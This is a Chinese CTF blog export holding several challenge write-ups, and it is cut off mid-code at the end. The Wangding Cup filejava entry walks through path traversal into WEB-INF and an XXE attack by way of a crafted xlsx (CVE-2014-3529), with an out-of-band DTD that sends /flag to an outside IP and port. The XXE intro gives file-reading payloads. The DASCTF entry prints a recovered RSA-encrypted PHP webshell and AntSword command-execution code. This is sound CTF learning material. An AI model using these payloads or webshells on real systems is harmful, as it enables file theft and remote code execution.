<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#125;e59ad3f38a01dca00f9759e6d205317642c5421fcdad034ebe7077c2bddd472b&#123;ASNI&quot; | rev</span><br></pre></td></tr></table></figure></div>

<p>得到flag，还新学了tr命令-s -c -d …..对文本很方便的操作</p>
<p>&nbsp;</p>
<p>做到这，后面我看咋一堆密码类的题呢，叭会做了，编作业去了</p>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2020网鼎杯filejava（Javaweb、CVE-2014-3529）</title>
    <url>/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/</url>
    <content><![CDATA[<p>本来这个题想放到初识XML那一篇里面的，发现有一些Javaweb知识后就把它单独列出来了</p>
<h3 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h3><p>目录穿越漏洞、利用xlsx构造xml</p>
<p>在随意上传一个文件后，显示文件下载地址 <code>./DownloadServlet?filename=c5293886-04c4-48ff-bfeb-602ab05b6478_1.phtml</code></p>
<p>比赛的时候因为对Javaweb了解太少，不知道目录结构，所以没想到去读取哪些文件</p>
<p>这里写一下Javaweb的大致目录结构：(源自CSDN上的<a href="https://blog.csdn.net/pan_junbiao/article/details/87865408" target="_blank" rel="noopener">pan_junbiao</a>师傅和<a href="https://blog.csdn.net/qq_33689414/article/details/56489930" target="_blank" rel="noopener">张行之</a>师傅)</p>
<blockquote>
<p><a href="https://img-blog.csdnimg.cn/20190221174700993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Bhbl9qdW5iaWFv,size_16,color_FFFFFF,t_70" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" title="img" data-src="https://img-blog.csdnimg.cn/20190221174700993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Bhbl9qdW5iaWFv,size_16,color_FFFFFF,t_70" src="/img/loading.gif" class="lazyload"></a></p>
<p>（1）Java Resources</p>
<ul>
<li>src：用来存放Java源文件。</li>
<li>Libraries：存放的是Tomcat及JRE中的jar包。</li>
</ul>
<p>（2）build：自动编译.java文件的目录。</p>
<p>（3）WebContent（WebRoot）：是这个Web应用的顶层目录，也称为文档根目录，由一下部分组成。</p>
<ul>
<li><p>META-INF：系统自动生成，存放系统描述信息。</p>
</li>
<li><ul>
<li><p>静态文件：包括所有的HTML网页、CSS文件、图像文件等。一般按功能已文件夹形式分类，例如，图像文件集中存储在images目录中。</p>
</li>
<li><p>JSP文件：利用JSP可以很方便地在页面中生成动态的内容，使Web应用可以输出动态页面。</p>
</li>
</ul>
</li>
<li><p>WEB-INF：该目录存在于文档根目录下。但是，该目录不能被引用，也就是说，该目录下存放的文件无法对外发布，当然就无法被用户访问到了。WEB-INF目录由以下几部分组成。</p>
</li>
<li><ul>
<li><p>classes：存放Java字节码文件的目录。</p>
</li>
<li><p>lib：用于存放该工程用到的库。它包含Web应用所需要的.jar或者.zip文件，例如：mysql-connector-java-8.0.14.jar（MySQL数据库的驱动程序）</p>
</li>
<li><p>web.xml：应用程序的部署描述符，web工程的配置文件，完成用户请求的逻辑名称到真正的servlet类的映射。Web应用的初始化配置文件，非常重要，不要将其删除或者随意修改。</p>
</li>
</ul>
</li>
</ul>
<p>凡是客户端能访问的资源(<em>html或</em>.jpg)必须跟WEB-INF在同一目录，即放在Web根目录下的资源，从客户端是可以通过URL地址直接访问的。</p>
</blockquote>
<p>下面我们读取一下web.xml文件<code>?filename=../../../../WEB-INF/web.xml</code>，得到</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>这里还需要了解什么是<servlet-class>，它是里面定义了用户请求的逻辑名称到真正servlet类的映射。</servlet-class></p>
<blockquote>
<p>WEB-INF/classes 目录包含了所有的 Servlet 类和其他类文件，类文件所在的目录结构与他们的包名称匹配。</p>
</blockquote>
<p>因此按web.xml给出的路径去把class文件下载下来</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure></div>

<p>class文件可以拿JD-GUI打开，代码审计，发现<code>UploadServlet.class</code>中，有对文件名和后缀的判断</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>图中先判断了文件开头是否为“excel-” 然后又判断了文件尾是否xlsx；</p>
<p>同时这里是Java环境，提示<code>poi-ooxml-3.10 has something wrong</code>，所以可以根据版本推测其漏洞也就是CVE-2014-3529</p>
<p>Apache POI OpenXML parser小科普：</p>
<blockquote>
<p>  Apache POI 是 Apache 软件基金会的开源项目，POI 提供 API 接口给 Java 程序对 Microsoft office 格式文档读写能力。</p>
<p>   Microsoft Office从2007版本引入了新的开放的XML文件格式，新的XML文件格式基于压缩的ZIP文件格式规范，由许多部分组成。我们可以将其解压缩到特定的文件夹中来查看其包含的文件夹和文件，可以发现其中多数是描述工作簿数据、元数据、文档信息的XML文件。所以不正确的读取07格式的Microsoft office 格式文件也存在着 XXE 攻击的可能性。</p>
</blockquote>
<p>因此我们可以想到利用xlsx来构造xml进行文件读取</p>
<p>这里可以用昨天看的<a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">无回显读取</a></p>
<blockquote>
<p><strong>以下调用过程：</strong></p>
<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 BTIS.dtd ，有点类似于将 BTIS.dtd 包含进来，然后 %int 调用 BTIS.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
<p>但是为啥我实体的值中有%了，没有用<code>&amp;#37;</code>，也可以。。。</p>
<p>还有下面的<code>&lt;!DOCTYPE BTIS [</code> 需要闭合<code>&lt;!DOCTYPE convert [</code> 不用闭合，有时间好好研究研究xml的规则（听同学说短学期MFC要用xml的，当时偷懒没用，现在人傻了。。。</p>
</blockquote>
<p>开个buu靶机，记一下内网ip(ifconfig)，写个dtd文件进去，拿参数实体拼接访问</p>
<p>先写靶机上写一个dtd文件</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;174.1.80.146:7788?btis&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>到这服务器监听7788端口就行了，等文件上传后就会在服务器上回显flag了</p>
<p>之后我们新建一个xlsx文件，改后缀为zip：</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>编辑<code>[Content_Types].xml</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">BTIS</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://174.1.80.146/BTIS.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span><span class="tag">&lt;<span class="name">BTIS</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后把后缀改回来，并且把文件名改为<code>excel-1</code>类似的来绕过对文件名开头的检测（要用excel-开头)</p>
<p>后面上传文件就行了(淦、为啥我上传好几次，上传不上去，老是卡，终于好了)</p>
<a href="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AFfilejava/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>&nbsp;</p>
<p>补充：如果尝试直接去读flag的话是行不通的，因为DownloadServlet中有过滤：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String fileName &#x3D; request.getParameter(&quot;filename&quot;);</span><br><span class="line">fileName &#x3D; new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);</span><br><span class="line">System.out.println(&quot;filename&#x3D;&quot; + fileName);</span><br><span class="line">if (fileName !&#x3D; null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) &#123;</span><br><span class="line">  request.setAttribute(&quot;message&quot;, &quot;&quot;);</span><br><span class="line">  request.getRequestDispatcher(&quot;&#x2F;message.jsp&quot;).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  </span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XXE</tag>
        <tag>Javaweb</tag>
      </tags>
  </entry>
  <entry>
    <title>初识XML(XXE)</title>
    <url>/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/</url>
    <content><![CDATA[<h3 id="基础知识（https-xz-aliyun-com-t-3357）"><a href="#基础知识（https-xz-aliyun-com-t-3357）" class="headerlink" title="基础知识（https://xz.aliyun.com/t/3357）"></a>基础知识（<a href="https://xz.aliyun.com/t/3357）" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357）</a></h3><p>1.DTD格式规范（元素-&gt;xml标签，实体-&gt;xml内容）</p>
<p>2.内部实体、外部实体、通用实体、参数实体</p>
<p>3.有回显、无回显读取文件（无回显可以把dtd放到自己vps上，从而将内容回显到vps上）</p>
<p>4.参数实体+ “<!--[CDATA["和 “]]-->”实现连续引用拼接（读取文件时里面有引起xml格式混淆的字符串）</p>
<p>5.内网相关（端口扫描、内网探测）</p>
<p>……</p>
<h3 id="BUU-Real-PHP-XXE"><a href="#BUU-Real-PHP-XXE" class="headerlink" title="BUU Real [PHP]XXE"></a>BUU Real [PHP]XXE</h3><p>开这个之前以为这个题挺难的，么有想到flag就在phpinfo()里。。</p>
<p>不过搜wp的时候也了解了点版本相关知识吧。</p>
<blockquote>
<p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。</p>
<p>dom.php # 示例：使用DOMDocument解析body</p>
<p>SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</p>
<p>simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</p>
</blockquote>
<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake  XML cookbook"></a>[NCTF2019]Fake  XML cookbook</h3><p>这个题目比较基础，flag就放在了<code>/flag</code>下面，直接构造xml用file协议去读取就好了</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  <span class="meta-keyword">BTIS</span>[ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>0<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>这里引用上面那篇文张作者的一张图：（常见平台的不同协议）</p>
<p><a href="/img/loading.gif" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" src="/img/loading.gif" class="lazyload" title="img"></a></p>
<h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>这个就要用到内网探测了。（SSRF？）</p>
<p>我们可以尝试读取：<code>/proc/net/arp</code> 或者 <code>/etc/host</code> 或者 <code>/etc/network/interfaces</code>，来获取内网存活的主机</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>看到两个，尝试访问一下，第一个好像⑧太行，访问第二个得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/13/%E5%88%9D%E8%AF%86XML(XXE)/2.png" src="/img/loading.gif" class="lazyload"></a>

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XML</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>近期总结</title>
    <url>/2020/05/08/36Dcup/</url>
    <content><![CDATA[<p>前几天出去玩了，ISCC、36D、De1都是打了一部分就没打了，毕竟五一嘛，还是要出去开心一下的</p>
<p>而且这几天事情虽然不多，但是有些学习上的乱七八糟的事情，闲下来也不想好好复盘，就知道快乐LOL。。</p>
<p>刚才尝试复盘了一下NPU的web，不得不说有点自闭，还是太菜了。</p>
<p>36D先开着，除去一些变态的misc和web我都会复盘的，但是在这之前我要把拖了N周的信号作业看上一看。</p>
<p>等明晚，肯定开搞，毕竟网鼎要来了，不能太拉后腿。（还是先从1分web刷起吧，近期嘴上说的萌新赛的比赛都是假的。气死👴了！</p>
<hr>
<p>我还是没更了</p>
<p>现在网鼎已经打完了，misc还是毫无人性，不过总体还是可以</p>
<p>昨晚把aa要的题目出完了，dockerfile嫖的nj师傅的，出了个简单的文件包含和备份</p>
<p>在测试部署题目的时候也学会了关于docker的很多东西</p>
<p>dockerfile大致能看懂怎么写了，会部署了，版本问题和权限控制也会了一些，也认识了docker打包</p>
<p>等啥时候能给安恒出web的时候，写篇详细的docker出题过程</p>
<p>还有就是，以后打算题目不按照比赛写了</p>
<p>一大块一大块的要一次性写的内容太多，没有创作动力和大块时间</p>
<p>以后一篇写一道就好了，misc和web都写</p>
<p>近期状态要赶紧调整了，每晚无意义的晚睡，白天听课时无意义的忙碌，既没有学到课本上的知识也没有学到比赛知识，而且可能快要开学或是考试了，要认真学学书本知识了，落的课太多了。。</p>
<p>早睡，认真听课，认真刷题，好好复习！冲冲冲</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF_2020_April</title>
    <url>/2020/04/25/DASCTF-2020-April/</url>
    <content><![CDATA[<p>虽然有一堆作业和ppt还没做，但是俯冲完中期报告还是有个闲适期的，然后就看比赛、多人运动（开黑）了，也复盘了一部分极客大挑战吧。还好今天安恒有个月赛玩，就来水一水。随便写点wp，也纪念一下我妹的生日（第一次在家一起过，不过好像跟平常的日子没啥子区别，哈哈。）然后的话，后面几天就把作业和两个项目ppt搞搞，顺便期待一下明天IG大战TES。</p>
<p>言归正传，这场比赛有两道web，四道misc，有一道web还是不会，搞会了就再来复盘一下</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc1-bluetooth"><a href="#misc1-bluetooth" class="headerlink" title="misc1(bluetooth)"></a>misc1(bluetooth)</h3><p>流量包分析，文件提取</p>
<p>首先拿到这道题，没啥思路，那堆协议也没见过，尝试binwalk一下，发现一个7z压缩包，用dd命令提取出来</p>
<p>发现里面的文本名称是<code>password_is_Bluetooth_PIN.txt</code>，然后就去流量包里找</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/25/DASCTF-2020-April/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>找到后解开压缩包，就得到flag了</p>
<h3 id="misc2-keyboard"><a href="#misc2-keyboard" class="headerlink" title="misc2(keyboard)"></a>misc2(keyboard)</h3><p>vol文件提取、电脑键盘QWE密码、大小写转换、VeraCrypt文件挂载、NTFS</p>
<p>下载得到两个文件，感觉很熟悉，有、像<code>1st XTUCTF</code>里面的一道取证，不过不太一样</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 pslist  <span class="comment">#查看进程，发现VeraCrypt.exe和keyboard-log.exe</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard  <span class="comment">#扫一下发现t.txt</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 --dump-dir=./ <span class="comment">#提取一下</span></span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>然后通过下图解密给出的<code>CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>得到<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>，提示小写更容易看出<code>veracryptpasswordiskeyboarddraobyek</code></p>
<p>得到密码<code>keyboarddraobyek</code>，但是下面提示还是要大写。。。</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>拿VeraCrypt.exe加载一下Secret</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>猜一手NTFS，拿NtfsStreamsEditor2.exe扫一下，或者用dir命令</p>
<h3 id="misc3-AWDshell"><a href="#misc3-AWDshell" class="headerlink" title="misc3(AWDshell)"></a>misc3(AWDshell)</h3><p>流量分析、RSA、AES、php代码大概审计</p>
<p>这是夏风师傅出的一道上传🐎的题（<a href="https://blog.xiafeng2333.top/ctf-18/" target="_blank" rel="noopener">出题思路</a></p>
<p>首先打开流量包发现一堆UDP，里面混淆着HTTP，追踪一下HTTP流</p>
<p>先在导出对象里看一下都有啥，然后把名字熟悉的，比如login.php、upload.php、index.php啥的</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/25/DASCTF-2020-April/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>在upload.php里面发现下面代码、发现是一个用蚁剑连接的、RSA加密的🐎</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------7e42cb506f4</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;pic&quot;; filename&#x3D;&quot;awdshell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; @$_POST[&#39;ant&#39;];</span><br><span class="line">$pk &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds &#x3D; explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$cmd &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure></div>

<p>然后追踪<code>1581335771.php</code>的一堆流量，在里面发现了上传的<code>name=&quot;ant&quot;</code></p>
<p>将上面代码里的<code>$cmd=@$_POST[&#39;ant&#39;];</code>改成上传的<code>ant</code>的值，放到一个php环境里，把上面的代码跑一下，会得到<code>ant</code>解密后的值（一串php代码</p>
<p>其实有很多上传的<code>1581335771.php</code>文件，需要一个一个去分析</p>
<p>但是重要的只有两个函数：<code>asenc()</code>、<code>asoutput()</code></p>
<p>其中第一个函数<code>asenc()</code>指明了AES的密钥session的前16位，也就是<code>Cookie: PHPSESSID=hm3pq66843bbbrdgphntt8fmc4</code>的前16位</p>
<p>第二个函数<code>asoutput()</code>给出了AES的密文，但是是混淆过后的，因为它前面和后面都有一些没有用的字符串</p>
<p>我下面就放出了其中一个解密结果，流38解密后的php代码段，就是有用的那一个</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> </span>&#123;</span><br><span class="line">	@session_start();</span><br><span class="line">	$key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"f3c7239848e0"</span>;</span><br><span class="line">	<span class="keyword">echo</span> @asenc($output);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"05fda2646c"</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$p=base64_decode($_POST[<span class="string">"t185a78b977a47"</span>]);</span><br><span class="line">	$s=base64_decode($_POST[<span class="string">"wd0b7c7ca226cb"</span>]);</span><br><span class="line">	$envstr=@base64_decode($_POST[<span class="string">"b8dcb72ce2ba93"</span>]);</span><br><span class="line">	$d=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">	$c=substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">"/"</span>?<span class="string">"-c \"&#123;$s&#125;\""</span>:<span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">	<span class="keyword">if</span>(substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">"/"</span>) &#123;</span><br><span class="line">		@putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).<span class="string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		@putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).<span class="string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($envstr)) &#123;</span><br><span class="line">		$envarr=explode(<span class="string">"|||asline|||"</span>, $envstr);</span><br><span class="line">		<span class="keyword">foreach</span>($envarr <span class="keyword">as</span> $v) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($v)) &#123;</span><br><span class="line">				@putenv(str_replace(<span class="string">"|||askey|||"</span>, <span class="string">"="</span>, $v));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$r=<span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span> </span>&#123;</span><br><span class="line">		$d=explode(<span class="string">","</span>,@ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">			$d=<span class="keyword">array</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$d=array_map(<span class="string">'trim'</span>,array_map(<span class="string">'strtolower'</span>,$d));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span><span class="params">($d, $c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (substr($d, <span class="number">0</span>, <span 